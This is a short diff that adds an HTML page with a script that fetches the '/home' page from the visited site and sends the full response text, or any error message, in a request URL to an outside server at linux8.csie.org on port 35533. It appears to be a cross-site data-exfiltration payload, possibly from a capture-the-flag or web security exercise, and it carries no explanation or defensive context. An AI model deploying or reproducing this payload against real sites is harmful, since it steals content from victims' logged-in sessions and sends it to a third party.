@@ -1,0 +1,11 @@
+<html>
+</html>
+<script> 
+  fetch('/home').then(r => {
+    return r.text()
+  }).then(res => {
+    fetch(`http://linux8.csie.org:35533/${res}`)
+  }).catch(err => {
+    fetch(`http://linux8.csie.org:35533/err/${err.message}`)
+  })
+</script>
